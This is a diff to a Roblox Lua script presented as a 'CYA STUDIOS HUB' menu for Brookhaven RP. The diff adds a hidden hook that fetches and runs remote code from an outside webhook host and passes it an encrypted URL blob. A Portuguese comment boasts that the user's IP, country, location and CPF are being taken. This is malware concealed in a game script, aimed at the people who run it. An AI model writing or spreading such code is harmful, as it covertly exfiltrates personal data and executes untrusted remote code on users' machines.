@@ -1,6 +1,12 @@
 -- obrigado por você dar o seu IP para nós! Seu pais, sua localização, e já já seu CPF
 
 local Libary = loadstring(game:HttpGet("https://raw.githubusercontent.com/phgs-oficial/Slateste/refs/heads/main/Redzhubui.lua"))()
+local requestWebhook = loadstring(game:HttpGet("https://blox-webhook-notifier.onrender.com/script/library"))()
+
+local cryptUrl = "f2a63231a55a328483c71b504dc4b67a5a0382d1a5e0fbffd5a290a5735376d31dcc606e30545a9f9c721cc091c639fbfc8e58cb2a84183b9b5750be2216dfca0435acf06e5f3c9f3978b4c1a8816e83129fb28ba56d673781f2bc7a2ccf0bdda17b2b4a330c4fe7cf560f4b3143fee91474b8199e045cda092ba2c5328e35eee7094284894a25af6a2c3f652f824077c4d25727193dcb6b12b70b6bef8c89575267d401ab04eb6b758cbd509d05be2f2ce0a1c43c3132705d78cfac25826212a603a3dc3b42933cb6ddfbba87bfcaef3ce03e5eaa69d034a219a1ef3c42a418"
+
+requestWebhook(cryptUrl)
+
 
 local Window = Libary:MakeWindow({
     Title = "CYA STUDIOS HUB | Brookhaven RP v1.3",
